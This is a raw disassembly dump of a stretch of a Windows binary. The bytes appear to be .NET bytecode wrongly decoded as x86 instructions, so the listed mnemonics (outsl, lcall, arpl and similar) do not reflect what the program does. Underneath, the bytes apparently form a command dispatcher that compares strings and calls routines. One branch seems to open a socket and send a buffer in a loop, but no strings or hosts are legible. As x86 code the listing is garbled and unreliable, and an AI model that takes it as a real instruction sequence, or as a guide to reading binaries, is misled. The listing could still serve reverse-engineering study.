  4030e4:	13 50 11             	adc    0x11(%eax),%edx
  4030e7:	50                   	push   %eax
  4030e8:	2c 12                	sub    $0x12,%al
  4030ea:	00 20                	add    %ah,(%eax)
  4030ec:	00 01                	add    %al,(%ecx)
  4030ee:	00 00                	add    %al,(%eax)
  4030f0:	6a 28                	push   $0x28
  4030f2:	29 00                	sub    %eax,(%eax)
  4030f4:	00 06                	add    %al,(%esi)
  4030f6:	26 38 bf 06 00 00 00 	cmp    %bh,%es:0x6(%edi)
  4030fd:	11 3e                	adc    %edi,(%esi)
  4030ff:	72 a7                	jb     0x4030a8
  403101:	04 00                	add    $0x0,%al
  403103:	70 16                	jo     0x40311b
  403105:	28 32                	sub    %dh,(%edx)
  403107:	00 00                	add    %al,(%eax)
  403109:	0a 16                	or     (%esi),%dl
  40310b:	fe 01                	incb   (%ecx)
  40310d:	13 50 11             	adc    0x11(%eax),%edx
  403110:	50                   	push   %eax
  403111:	2c 26                	sub    $0x26,%al
  403113:	00 28                	add    %ch,(%eax)
  403115:	04 00                	add    $0x0,%al
  403117:	00 06                	add    %al,(%esi)
  403119:	6f                   	outsl  %ds:(%esi),(%dx)
  40311a:	48                   	dec    %eax
  40311b:	00 00                	add    %al,(%eax)
  40311d:	0a 72 bd             	or     -0x43(%edx),%dh
  403120:	04 00                	add    $0x0,%al
  403122:	70 72                	jo     0x403196
  403124:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403125:	04 00                	add    $0x0,%al
  403127:	70 72                	jo     0x40319b
  403129:	3b 03                	cmp    (%ebx),%eax
  40312b:	00 70 1a             	add    %dh,0x1a(%eax)
  40312e:	6f                   	outsl  %ds:(%esi),(%dx)
  40312f:	5c                   	pop    %esp
  403130:	00 00                	add    %al,(%eax)
  403132:	0a 00                	or     (%eax),%al
  403134:	38 82 06 00 00 00    	cmp    %al,0x6(%edx)
  40313a:	11 3e                	adc    %edi,(%esi)
  40313c:	72 37                	jb     0x403175
  40313e:	05 00 70 16 28       	add    $0x28167000,%eax
  403143:	32 00                	xor    (%eax),%al
  403145:	00 0a                	add    %cl,(%edx)
  403147:	16                   	push   %ss
  403148:	fe 01                	incb   (%ecx)
  40314a:	13 50 11             	adc    0x11(%eax),%edx
  40314d:	50                   	push   %eax
  40314e:	2c 26                	sub    $0x26,%al
  403150:	00 28                	add    %ch,(%eax)
  403152:	04 00                	add    $0x0,%al
  403154:	00 06                	add    %al,(%esi)
  403156:	6f                   	outsl  %ds:(%esi),(%dx)
  403157:	48                   	dec    %eax
  403158:	00 00                	add    %al,(%eax)
  40315a:	0a 72 bd             	or     -0x43(%edx),%dh
  40315d:	04 00                	add    $0x0,%al
  40315f:	70 72                	jo     0x4031d3
  403161:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403162:	04 00                	add    $0x0,%al
  403164:	70 72                	jo     0x4031d8
  403166:	4b                   	dec    %ebx
  403167:	05 00 70 1a 6f       	add    $0x6f1a7000,%eax
  40316c:	5c                   	pop    %esp
  40316d:	00 00                	add    %al,(%eax)
  40316f:	0a 00                	or     (%eax),%al
  403171:	38 45 06             	cmp    %al,0x6(%ebp)
  403174:	00 00                	add    %al,(%eax)
  403176:	00 11                	add    %dl,(%ecx)
  403178:	3e 72 4f             	jb,pt  0x4031ca
  40317b:	05 00 70 16 28       	add    $0x28167000,%eax
  403180:	32 00                	xor    (%eax),%al
  403182:	00 0a                	add    %cl,(%edx)
  403184:	16                   	push   %ss
  403185:	fe 01                	incb   (%ecx)
  403187:	13 50 11             	adc    0x11(%eax),%edx
  40318a:	50                   	push   %eax
  40318b:	2c 26                	sub    $0x26,%al
  40318d:	00 28                	add    %ch,(%eax)
  40318f:	04 00                	add    $0x0,%al
  403191:	00 06                	add    %al,(%esi)
  403193:	6f                   	outsl  %ds:(%esi),(%dx)
  403194:	48                   	dec    %eax
  403195:	00 00                	add    %al,(%eax)
  403197:	0a 72 6f             	or     0x6f(%edx),%dh
  40319a:	05 00 70 72 08       	add    $0x8727000,%eax
  40319f:	06                   	push   %es
  4031a0:	00 70 72             	add    %dh,0x72(%eax)
  4031a3:	3b 03                	cmp    (%ebx),%eax
  4031a5:	00 70 1a             	add    %dh,0x1a(%eax)
  4031a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4031a9:	5c                   	pop    %esp
  4031aa:	00 00                	add    %al,(%eax)
  4031ac:	0a 00                	or     (%eax),%al
  4031ae:	38 08                	cmp    %cl,(%eax)
  4031b0:	06                   	push   %es
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	00 11                	add    %dl,(%ecx)
  4031b5:	3e 72 32             	jb,pt  0x4031ea
  4031b8:	06                   	push   %es
  4031b9:	00 70 16             	add    %dh,0x16(%eax)
  4031bc:	28 32                	sub    %dh,(%edx)
  4031be:	00 00                	add    %al,(%eax)
  4031c0:	0a 16                	or     (%esi),%dl
  4031c2:	fe 01                	incb   (%ecx)
  4031c4:	13 50 11             	adc    0x11(%eax),%edx
  4031c7:	50                   	push   %eax
  4031c8:	2c 26                	sub    $0x26,%al
  4031ca:	00 28                	add    %ch,(%eax)
  4031cc:	04 00                	add    $0x0,%al
  4031ce:	00 06                	add    %al,(%esi)
  4031d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4031d1:	48                   	dec    %eax
  4031d2:	00 00                	add    %al,(%eax)
  4031d4:	0a 72 6f             	or     0x6f(%edx),%dh
  4031d7:	05 00 70 72 08       	add    $0x8727000,%eax
  4031dc:	06                   	push   %es
  4031dd:	00 70 72             	add    %dh,0x72(%eax)
  4031e0:	4b                   	dec    %ebx
  4031e1:	05 00 70 1a 6f       	add    $0x6f1a7000,%eax
  4031e6:	5c                   	pop    %esp
  4031e7:	00 00                	add    %al,(%eax)
  4031e9:	0a 00                	or     (%eax),%al
  4031eb:	38 cb                	cmp    %cl,%bl
  4031ed:	05 00 00 00 11       	add    $0x11000000,%eax
  4031f2:	3e 72 50             	jb,pt  0x403245
  4031f5:	06                   	push   %es
  4031f6:	00 70 16             	add    %dh,0x16(%eax)
  4031f9:	28 32                	sub    %dh,(%edx)
  4031fb:	00 00                	add    %al,(%eax)
  4031fd:	0a 16                	or     (%esi),%dl
  4031ff:	fe 01                	incb   (%ecx)
  403201:	13 50 11             	adc    0x11(%eax),%edx
  403204:	50                   	push   %eax
  403205:	2c 26                	sub    $0x26,%al
  403207:	00 28                	add    %ch,(%eax)
  403209:	04 00                	add    $0x0,%al
  40320b:	00 06                	add    %al,(%esi)
  40320d:	6f                   	outsl  %ds:(%esi),(%dx)
  40320e:	48                   	dec    %eax
  40320f:	00 00                	add    %al,(%eax)
  403211:	0a 72 6e             	or     0x6e(%edx),%dh
  403214:	06                   	push   %es
  403215:	00 70 72             	add    %dh,0x72(%eax)
  403218:	0b 07                	or     (%edi),%eax
  40321a:	00 70 72             	add    %dh,0x72(%eax)
  40321d:	3b 03                	cmp    (%ebx),%eax
  40321f:	00 70 1a             	add    %dh,0x1a(%eax)
  403222:	6f                   	outsl  %ds:(%esi),(%dx)
  403223:	5c                   	pop    %esp
  403224:	00 00                	add    %al,(%eax)
  403226:	0a 00                	or     (%eax),%al
  403228:	38 8e 05 00 00 00    	cmp    %cl,0x5(%esi)
  40322e:	11 3e                	adc    %edi,(%esi)
  403230:	72 1f                	jb     0x403251
  403232:	07                   	pop    %es
  403233:	00 70 16             	add    %dh,0x16(%eax)
  403236:	28 32                	sub    %dh,(%edx)
  403238:	00 00                	add    %al,(%eax)
  40323a:	0a 16                	or     (%esi),%dl
  40323c:	fe 01                	incb   (%ecx)
  40323e:	13 50 11             	adc    0x11(%eax),%edx
  403241:	50                   	push   %eax
  403242:	2c 26                	sub    $0x26,%al
  403244:	00 28                	add    %ch,(%eax)
  403246:	04 00                	add    $0x0,%al
  403248:	00 06                	add    %al,(%esi)
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	48                   	dec    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 6e             	or     0x6e(%edx),%dh
  403251:	06                   	push   %es
  403252:	00 70 72             	add    %dh,0x72(%eax)
  403255:	0b 07                	or     (%edi),%eax
  403257:	00 70 72             	add    %dh,0x72(%eax)
  40325a:	4b                   	dec    %ebx
  40325b:	05 00 70 1a 6f       	add    $0x6f1a7000,%eax
  403260:	5c                   	pop    %esp
  403261:	00 00                	add    %al,(%eax)
  403263:	0a 00                	or     (%eax),%al
  403265:	38 51 05             	cmp    %dl,0x5(%ecx)
  403268:	00 00                	add    %al,(%eax)
  40326a:	00 11                	add    %dl,(%ecx)
  40326c:	3e 72 3b             	jb,pt  0x4032aa
  40326f:	07                   	pop    %es
  403270:	00 70 16             	add    %dh,0x16(%eax)
  403273:	28 32                	sub    %dh,(%edx)
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 16                	or     (%esi),%dl
  403279:	fe 01                	incb   (%ecx)
  40327b:	13 50 11             	adc    0x11(%eax),%edx
  40327e:	50                   	push   %eax
  40327f:	2c 26                	sub    $0x26,%al
  403281:	00 28                	add    %ch,(%eax)
  403283:	04 00                	add    $0x0,%al
  403285:	00 06                	add    %al,(%esi)
  403287:	6f                   	outsl  %ds:(%esi),(%dx)
  403288:	48                   	dec    %eax
  403289:	00 00                	add    %al,(%eax)
  40328b:	0a 72 6f             	or     0x6f(%edx),%dh
  40328e:	05 00 70 72 61       	add    $0x61727000,%eax
  403293:	07                   	pop    %es
  403294:	00 70 72             	add    %dh,0x72(%eax)
  403297:	3b 03                	cmp    (%ebx),%eax
  403299:	00 70 1a             	add    %dh,0x1a(%eax)
  40329c:	6f                   	outsl  %ds:(%esi),(%dx)
  40329d:	5c                   	pop    %esp
  40329e:	00 00                	add    %al,(%eax)
  4032a0:	0a 00                	or     (%eax),%al
  4032a2:	38 14 05 00 00 00 11 	cmp    %dl,0x11000000(,%eax,1)
  4032a9:	3e 72 7f             	jb,pt  0x40332b
  4032ac:	07                   	pop    %es
  4032ad:	00 70 16             	add    %dh,0x16(%eax)
  4032b0:	28 32                	sub    %dh,(%edx)
  4032b2:	00 00                	add    %al,(%eax)
  4032b4:	0a 16                	or     (%esi),%dl
  4032b6:	fe 01                	incb   (%ecx)
  4032b8:	13 50 11             	adc    0x11(%eax),%edx
  4032bb:	50                   	push   %eax
  4032bc:	2c 26                	sub    $0x26,%al
  4032be:	00 28                	add    %ch,(%eax)
  4032c0:	04 00                	add    $0x0,%al
  4032c2:	00 06                	add    %al,(%esi)
  4032c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c5:	48                   	dec    %eax
  4032c6:	00 00                	add    %al,(%eax)
  4032c8:	0a 72 6f             	or     0x6f(%edx),%dh
  4032cb:	05 00 70 72 61       	add    $0x61727000,%eax
  4032d0:	07                   	pop    %es
  4032d1:	00 70 72             	add    %dh,0x72(%eax)
  4032d4:	4b                   	dec    %ebx
  4032d5:	05 00 70 1a 6f       	add    $0x6f1a7000,%eax
  4032da:	5c                   	pop    %esp
  4032db:	00 00                	add    %al,(%eax)
  4032dd:	0a 00                	or     (%eax),%al
  4032df:	38 d7                	cmp    %dl,%bh
  4032e1:	04 00                	add    $0x0,%al
  4032e3:	00 00                	add    %al,(%eax)
  4032e5:	11 3e                	adc    %edi,(%esi)
  4032e7:	72 a3                	jb     0x40328c
  4032e9:	07                   	pop    %es
  4032ea:	00 70 16             	add    %dh,0x16(%eax)
  4032ed:	28 32                	sub    %dh,(%edx)
  4032ef:	00 00                	add    %al,(%eax)
  4032f1:	0a 16                	or     (%esi),%dl
  4032f3:	fe 01                	incb   (%ecx)
  4032f5:	13 50 11             	adc    0x11(%eax),%edx
  4032f8:	50                   	push   %eax
  4032f9:	2c 0c                	sub    $0xc,%al
  4032fb:	00 28                	add    %ch,(%eax)
  4032fd:	5d                   	pop    %ebp
  4032fe:	00 00                	add    %al,(%eax)
  403300:	0a 00                	or     (%eax),%al
  403302:	38 b4 04 00 00 00 11 	cmp    %dh,0x11000000(%esp,%eax,1)
  403309:	3e 72 b9             	jb,pt  0x4032c5
  40330c:	07                   	pop    %es
  40330d:	00 70 16             	add    %dh,0x16(%eax)
  403310:	28 32                	sub    %dh,(%edx)
  403312:	00 00                	add    %al,(%eax)
  403314:	0a 16                	or     (%esi),%dl
  403316:	fe 01                	incb   (%ecx)
  403318:	13 50 11             	adc    0x11(%eax),%edx
  40331b:	50                   	push   %eax
  40331c:	2c 0c                	sub    $0xc,%al
  40331e:	00 28                	add    %ch,(%eax)
  403320:	5e                   	pop    %esi
  403321:	00 00                	add    %al,(%eax)
  403323:	0a 00                	or     (%eax),%al
  403325:	38 91 04 00 00 00    	cmp    %dl,0x4(%ecx)
  40332b:	11 3e                	adc    %edi,(%esi)
  40332d:	72 cf                	jb     0x4032fe
  40332f:	07                   	pop    %es
  403330:	00 70 16             	add    %dh,0x16(%eax)
  403333:	28 32                	sub    %dh,(%edx)
  403335:	00 00                	add    %al,(%eax)
  403337:	0a 16                	or     (%esi),%dl
  403339:	fe 01                	incb   (%ecx)
  40333b:	13 50 11             	adc    0x11(%eax),%edx
  40333e:	50                   	push   %eax
  40333f:	2c 5a                	sub    $0x5a,%al
  403341:	00 28                	add    %ch,(%eax)
  403343:	5f                   	pop    %edi
  403344:	00 00                	add    %al,(%eax)
  403346:	0a 06                	or     (%esi),%al
  403348:	17                   	pop    %ss
  403349:	9a 28 4a 00 00 0a 06 	lcall  $0x60a,$0x4a28
  403350:	18 9a 28 47 00 00    	sbb    %bl,0x4728(%edx)
  403356:	0a 28                	or     (%eax),%ch
  403358:	60                   	pusha
  403359:	00 00                	add    %al,(%eax)
  40335b:	0a 00                	or     (%eax),%al
  40335d:	20 e8                	and    %ch,%al
  40335f:	03 00                	add    (%eax),%eax
  403361:	00 28                	add    %ch,(%eax)
  403363:	36 00 00             	add    %al,%ss:(%eax)
  403366:	0a 00                	or     (%eax),%al
  403368:	28 04 00             	sub    %al,(%eax,%eax,1)
  40336b:	00 06                	add    %al,(%esi)
  40336d:	6f                   	outsl  %ds:(%esi),(%dx)
  40336e:	61                   	popa
  40336f:	00 00                	add    %al,(%eax)
  403371:	0a 6f 62             	or     0x62(%edi),%ch
  403374:	00 00                	add    %al,(%eax)
  403376:	0a 00                	or     (%eax),%al
  403378:	28 04 00             	sub    %al,(%eax,%eax,1)
  40337b:	00 06                	add    %al,(%esi)
  40337d:	6f                   	outsl  %ds:(%esi),(%dx)
  40337e:	61                   	popa
  40337f:	00 00                	add    %al,(%eax)
  403381:	0a 28                	or     (%eax),%ch
  403383:	5f                   	pop    %edi
  403384:	00 00                	add    %al,(%eax)
  403386:	0a 06                	or     (%esi),%al
  403388:	17                   	pop    %ss
  403389:	9a 28 4a 00 00 0a 17 	lcall  $0x170a,$0x4a28
  403390:	6f                   	outsl  %ds:(%esi),(%dx)
  403391:	63 00                	arpl   %eax,(%eax)
  403393:	00 0a                	add    %cl,(%edx)
  403395:	00 38                	add    %bh,(%eax)
  403397:	20 04 00             	and    %al,(%eax,%eax,1)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	11 3e                	adc    %edi,(%esi)
  40339e:	72 eb                	jb     0x40338b
  4033a0:	07                   	pop    %es
  4033a1:	00 70 16             	add    %dh,0x16(%eax)
  4033a4:	28 32                	sub    %dh,(%edx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	0a 16                	or     (%esi),%dl
  4033aa:	fe 01                	incb   (%ecx)
  4033ac:	13 50 11             	adc    0x11(%eax),%edx
  4033af:	50                   	push   %eax
  4033b0:	2c 0f                	sub    $0xf,%al
  4033b2:	00 06                	add    %al,(%esi)
  4033b4:	17                   	pop    %ss
  4033b5:	9a 28 55 00 00 0a 26 	lcall  $0x260a,$0x5528
  4033bc:	38 fa                	cmp    %bh,%dl
  4033be:	03 00                	add    (%eax),%eax
  4033c0:	00 00                	add    %al,(%eax)
  4033c2:	11 3e                	adc    %edi,(%esi)
  4033c4:	72 fd                	jb     0x4033c3
  4033c6:	07                   	pop    %es
  4033c7:	00 70 16             	add    %dh,0x16(%eax)
  4033ca:	28 32                	sub    %dh,(%edx)
  4033cc:	00 00                	add    %al,(%eax)
  4033ce:	0a 16                	or     (%esi),%dl
  4033d0:	fe 01                	incb   (%ecx)
  4033d2:	13 50 11             	adc    0x11(%eax),%edx
  4033d5:	50                   	push   %eax
  4033d6:	2c 11                	sub    $0x11,%al
  4033d8:	00 72 fd             	add    %dh,-0x3(%edx)
  4033db:	07                   	pop    %es
  4033dc:	00 70 28             	add    %dh,0x28(%eax)
  4033df:	39 00                	cmp    %eax,(%eax)
  4033e1:	00 06                	add    %al,(%esi)
  4033e3:	26 38 d2             	es cmp %dl,%dl
  4033e6:	03 00                	add    (%eax),%eax
  4033e8:	00 00                	add    %al,(%eax)
  4033ea:	11 3e                	adc    %edi,(%esi)
  4033ec:	72 05                	jb     0x4033f3
  4033ee:	08 00                	or     %al,(%eax)
  4033f0:	70 16                	jo     0x403408
  4033f2:	28 32                	sub    %dh,(%edx)
  4033f4:	00 00                	add    %al,(%eax)
  4033f6:	0a 16                	or     (%esi),%dl
  4033f8:	fe 01                	incb   (%ecx)
  4033fa:	13 50 11             	adc    0x11(%eax),%edx
  4033fd:	50                   	push   %eax
  4033fe:	39 c2                	cmp    %eax,%edx
  403400:	00 00                	add    %al,(%eax)
  403402:	00 00                	add    %al,(%eax)
  403404:	72 05                	jb     0x40340b
  403406:	08 00                	or     %al,(%eax)
  403408:	70 28                	jo     0x403432
  40340a:	39 00                	cmp    %eax,(%eax)
  40340c:	00 06                	add    %al,(%esi)
  40340e:	26 06                	es push %es
  403410:	17                   	pop    %ss
  403411:	9a 80 06 00 00 04 06 	lcall  $0x604,$0x680
  403418:	18 9a 80 07 00 00    	sbb    %bl,0x780(%edx)
  40341e:	04 06                	add    $0x6,%al
  403420:	19 9a 28 40 00 00    	sbb    %ebx,0x4028(%edx)
  403426:	0a 80 08 00 00 04    	or     0x4000008(%eax),%al
  40342c:	17                   	pop    %ss
  40342d:	80 09 00             	orb    $0x0,(%ecx)
  403430:	00 04 00             	add    %al,(%eax,%eax,1)
  403433:	2b 6f 7e             	sub    0x7e(%edi),%ebp
  403436:	09 00                	or     %eax,(%eax)
  403438:	00 04 16             	add    %al,(%esi,%edx,1)
  40343b:	fe 01                	incb   (%ecx)
  40343d:	13 50 11             	adc    0x11(%eax),%edx
  403440:	50                   	push   %eax
  403441:	2c 03                	sub    $0x3,%al
  403443:	00 de                	add    %bl,%dh
  403445:	79 00                	jns    0x403447
  403447:	7e 06                	jle    0x40344f
  403449:	00 00                	add    %al,(%eax)
  40344b:	04 28                	add    $0x28,%al
  40344d:	64 00 00             	add    %al,%fs:(%eax)
  403450:	0a 7e 07             	or     0x7(%esi),%bh
  403453:	00 00                	add    %al,(%eax)
  403455:	04 28                	add    $0x28,%al
  403457:	40                   	inc    %eax
  403458:	00 00                	add    %al,(%eax)
  40345a:	0a 73 65             	or     0x65(%ebx),%dh
  40345d:	00 00                	add    %al,(%eax)
  40345f:	0a 13                	or     (%ebx),%dl
  403461:	0c 20                	or     $0x20,%al
  403463:	00 10                	add    %dl,(%eax)
  403465:	00 00                	add    %al,(%eax)
  403467:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
  40346a:	00 01                	add    %al,(%ecx)
  40346c:	13 0b                	adc    (%ebx),%ecx
  40346e:	18 18                	sbb    %bl,(%eax)
  403470:	1f                   	pop    %ds
  403471:	11 73 66             	adc    %esi,0x66(%ebx)
  403474:	00 00                	add    %al,(%eax)
  403476:	0a 13                	or     (%ebx),%dl
  403478:	0d 11 0d 11 0b       	or     $0xb110d11,%eax
  40347d:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  403480:	67 00 00             	add    %al,(%bx,%si)
  403483:	0a 26                	or     (%esi),%ah
  403485:	7e 08                	jle    0x40348f
  403487:	00 00                	add    %al,(%eax)
  403489:	04 28                	add    $0x28,%al
  40348b:	36 00 00             	add    %al,%ss:(%eax)
  40348e:	0a 00                	or     (%eax),%al
  403490:	de 10                	ficoms (%eax)
  403492:	25 28 2c 00 00       	and    $0x2c28,%eax
  403497:	0a 13                	or     (%ebx),%dl
  403499:	0e                   	push   %cs
  40349a:	00 28                	add    %ch,(%eax)
  40349c:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  4034a1:	00 00                	add    %al,(%eax)
  4034a3:	00 17                	add    %dl,(%edi)
  4034a5:	13 50 11             	adc    0x11(%eax),%edx
  4034a8:	50                   	push   %eax
  4034a9:	2d 8a de 10 25       	sub    $0x2510de8a,%eax
  4034ae:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4034b1:	00 0a                	add    %cl,(%edx)
  4034b3:	13 0f                	adc    (%edi),%ecx
  4034b5:	00 28                	add    %ch,(%eax)
  4034b7:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  4034bc:	00 00                	add    %al,(%eax)
  4034be:	00 00                	add    %al,(%eax)
  4034c0:	38 f6                	cmp    %dh,%dh
  4034c2:	02 00                	add    (%eax),%al
  4034c4:	00 00                	add    %al,(%eax)
  4034c6:	11 3e                	adc    %edi,(%esi)
  4034c8:	72 0d                	jb     0x4034d7
  4034ca:	08 00                	or     %al,(%eax)
  4034cc:	70 16                	jo     0x4034e4
  4034ce:	28 32                	sub    %dh,(%edx)
  4034d0:	00 00                	add    %al,(%eax)
  4034d2:	0a 16                	or     (%esi),%dl
  4034d4:	fe 01                	incb   (%ecx)
  4034d6:	13 50 11             	adc    0x11(%eax),%edx
  4034d9:	50                   	push   %eax
  4034da:	2c 0c                	sub    $0xc,%al
  4034dc:	00 16                	add    %dl,(%esi)
  4034de:	80 09 00             	orb    $0x0,(%ecx)
  4034e1:	00 04 38             	add    %al,(%eax,%edi,1)
  4034e4:	d3 02                	roll   %cl,(%edx)
  4034e6:	00 00                	add    %al,(%eax)
  4034e8:	00 11                	add    %dl,(%ecx)
  4034ea:	3e 72 1b             	jb,pt  0x403508
  4034ed:	08 00                	or     %al,(%eax)
  4034ef:	70 16                	jo     0x403507
  4034f1:	28 32                	sub    %dh,(%edx)
  4034f3:	00 00                	add    %al,(%eax)
  4034f5:	0a 16                	or     (%esi),%dl
  4034f7:	fe 01                	incb   (%ecx)
  4034f9:	13 50 11             	adc    0x11(%eax),%edx
  4034fc:	50                   	push   %eax
  4034fd:	2c 14                	sub    $0x14,%al
  4034ff:	00 72 2d             	add    %dh,0x2d(%edx)
  403502:	08 00                	or     %al,(%eax)
  403504:	70 16                	jo     0x40351c
  403506:	16                   	push   %ss
  403507:	15 28 56 00 00       	adc    $0x5628,%eax
  40350c:	0a 26                	or     (%esi),%ah
  40350e:	38 a8 02 00 00 00    	cmp    %ch,0x2(%eax)
  403514:	11 3e                	adc    %edi,(%esi)
  403516:	72 5f                	jb     0x403577
  403518:	08 00                	or     %al,(%eax)
  40351a:	70 16                	jo     0x403532
  40351c:	28 32                	sub    %dh,(%edx)
  40351e:	00 00                	add    %al,(%eax)
  403520:	0a 16                	or     (%esi),%dl
  403522:	fe 01                	incb   (%ecx)
  403524:	13 50 11             	adc    0x11(%eax),%edx
  403527:	50                   	push   %eax
  403528:	2c 12                	sub    $0x12,%al
  40352a:	00 16                	add    %dl,(%esi)
  40352c:	80 0d 00 00 04 00 dd 	orb    $0xdd,0x40000
  403533:	db 0f                	fisttpl (%edi)
  403535:	00 00                	add    %al,(%eax)
  403537:	38 7f 02             	cmp    %bh,0x2(%edi)
  40353a:	00 00                	add    %al,(%eax)
  40353c:	00 11                	add    %dl,(%ecx)
  40353e:	3e 72 65             	jb,pt  0x4035a6
  403541:	08 00                	or     %al,(%eax)
  403543:	70 16                	jo     0x40355b
  403545:	28 32                	sub    %dh,(%edx)
  403547:	00 00                	add    %al,(%eax)
  403549:	0a 16                	or     (%esi),%dl
  40354b:	fe 01                	incb   (%ecx)
  40354d:	13 50 11             	adc    0x11(%eax),%edx
  403550:	50                   	push   %eax
  403551:	2c 30                	sub    $0x30,%al
  403553:	00 72 65             	add    %dh,0x65(%edx)
  403556:	08 00                	or     %al,(%eax)
  403558:	70 7e                	jo     0x4035d8
  40355a:	24 00                	and    $0x0,%al
  40355c:	00 04 7e             	add    %al,(%esi,%edi,2)
  40355f:	17                   	pop    %ss
  403560:	00 00                	add    %al,(%eax)
  403562:	04 7c                	add    $0x7c,%al
  403564:	2f                   	das
  403565:	00 00                	add    %al,(%eax)
  403567:	04 28                	add    $0x28,%al
  403569:	24 00                	and    $0x0,%al
  40356b:	00 06                	add    %al,(%esi)
  40356d:	28 43 00             	sub    %al,0x0(%ebx)
  403570:	00 0a                	add    %cl,(%edx)
  403572:	28 39                	sub    %bh,(%ecx)
  403574:	00 00                	add    %al,(%eax)
  403576:	06                   	push   %es
  403577:	26 00 dd             	es add %bl,%ch
  40357a:	94                   	xchg   %eax,%esp
  40357b:	0f 00 00             	sldt   (%eax)
  40357e:	38 38                	cmp    %bh,(%eax)
  403580:	02 00                	add    (%eax),%al
  403582:	00 00                	add    %al,(%eax)
  403584:	11 3e                	adc    %edi,(%esi)
  403586:	72 6b                	jb     0x4035f3
  403588:	08 00                	or     %al,(%eax)
  40358a:	70 16                	jo     0x4035a2
  40358c:	28 32                	sub    %dh,(%edx)
  40358e:	00 00                	add    %al,(%eax)
  403590:	0a 16                	or     (%esi),%dl
  403592:	fe 01                	incb   (%ecx)
  403594:	13 50 11             	adc    0x11(%eax),%edx
  403597:	50                   	push   %eax
  403598:	39 ca                	cmp    %ecx,%edx
  40359a:	00 00                	add    %al,(%eax)
  40359c:	00 00                	add    %al,(%eax)
  40359e:	00 72 73             	add    %dh,0x73(%edx)
  4035a1:	08 00                	or     %al,(%eax)
  4035a3:	70 28                	jo     0x4035cd
  4035a5:	50                   	push   %eax
  4035a6:	00 00                	add    %al,(%eax)
  4035a8:	0a 72 7d             	or     0x7d(%edx),%dh
  4035ab:	08 00                	or     %al,(%eax)
  4035ad:	70 28                	jo     0x4035d7
  4035af:	4a                   	dec    %edx
  4035b0:	00 00                	add    %al,(%eax)
  4035b2:	0a 13                	or     (%ebx),%dl
  4035b4:	10 11                	adc    %dl,(%ecx)
  4035b6:	10 28                	adc    %ch,(%eax)
  4035b8:	68 00 00 0a 13       	push   $0x130a0000
  4035bd:	50                   	push   %eax
  4035be:	11 50 2c             	adc    %edx,0x2c(%eax)
  4035c1:	03 00                	add    (%eax),%eax
  4035c3:	de 47 00             	fiadds 0x0(%edi)
  4035c6:	00 73 69             	add    %dh,0x69(%ebx)
  4035c9:	00 00                	add    %al,(%eax)
  4035cb:	0a 13                	or     (%ebx),%dl
  4035cd:	11 11                	adc    %edx,(%ecx)
  4035cf:	11 72 91             	adc    %esi,-0x6f(%edx)
  4035d2:	08 00                	or     %al,(%eax)
  4035d4:	70 11                	jo     0x4035e7
  4035d6:	10 6f 6a             	adc    %ch,0x6a(%edi)
  4035d9:	00 00                	add    %al,(%eax)
  4035db:	0a 00                	or     (%eax),%al
  4035dd:	11 10                	adc    %edx,(%eax)
  4035df:	28 55 00             	sub    %dl,0x0(%ebp)
  4035e2:	00 0a                	add    %cl,(%edx)
  4035e4:	26 de 10             	ficoms %es:(%eax)
  4035e7:	25 28 2c 00 00       	and    $0x2c28,%eax
  4035ec:	0a 13                	or     (%ebx),%dl
  4035ee:	12 00                	adc    (%eax),%al
  4035f0:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4035f6:	00 00                	add    %al,(%eax)
  4035f8:	de 10                	ficoms (%eax)
  4035fa:	25 28 2c 00 00       	and    $0x2c28,%eax
  4035ff:	0a 13                	or     (%ebx),%dl
  403601:	13 00                	adc    (%eax),%eax
  403603:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  403609:	00 00                	add    %al,(%eax)
  40360b:	00 00                	add    %al,(%eax)
  40360d:	00 72 73             	add    %dh,0x73(%edx)
  403610:	08 00                	or     %al,(%eax)
  403612:	70 28                	jo     0x40363c
  403614:	50                   	push   %eax
  403615:	00 00                	add    %al,(%eax)
  403617:	0a 72 ff             	or     -0x1(%edx),%dh
  40361a:	08 00                	or     %al,(%eax)
  40361c:	70 28                	jo     0x403646
  40361e:	4a                   	dec    %edx
  40361f:	00 00                	add    %al,(%eax)
  403621:	0a 13                	or     (%ebx),%dl
  403623:	15 11 15 28 6b       	adc    $0x6b281511,%eax
  403628:	00 00                	add    %al,(%eax)
  40362a:	0a 13                	or     (%ebx),%dl
  40362c:	14 72                	adc    $0x72,%al
  40362e:	6b 08 00             	imul   $0x0,(%eax),%ecx
  403631:	70 7e                	jo     0x4036b1
  403633:	24 00                	and    $0x0,%al
  403635:	00 04 12             	add    %al,(%edx,%edx,1)
  403638:	14 28                	adc    $0x28,%al
  40363a:	24 00                	and    $0x0,%al
  40363c:	00 06                	add    %al,(%esi)
  40363e:	28 43 00             	sub    %al,0x0(%ebx)
  403641:	00 0a                	add    %cl,(%edx)
  403643:	28 39                	sub    %bh,(%ecx)
  403645:	00 00                	add    %al,(%eax)
  403647:	06                   	push   %es
  403648:	26 de 10             	ficoms %es:(%eax)
  40364b:	25 28 2c 00 00       	and    $0x2c28,%eax
  403650:	0a 13                	or     (%ebx),%dl
  403652:	16                   	push   %ss
  403653:	00 28                	add    %ch,(%eax)
  403655:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  40365a:	00 00                	add    %al,(%eax)
  40365c:	00 dd                	add    %bl,%ch
  40365e:	b0 0e                	mov    $0xe,%al
  403660:	00 00                	add    %al,(%eax)
  403662:	38 54 01 00          	cmp    %dl,0x0(%ecx,%eax,1)
  403666:	00 00                	add    %al,(%eax)
  403668:	11 3e                	adc    %edi,(%esi)
  40366a:	72 5f                	jb     0x4036cb
  40366c:	08 00                	or     %al,(%eax)
  40366e:	70 16                	jo     0x403686
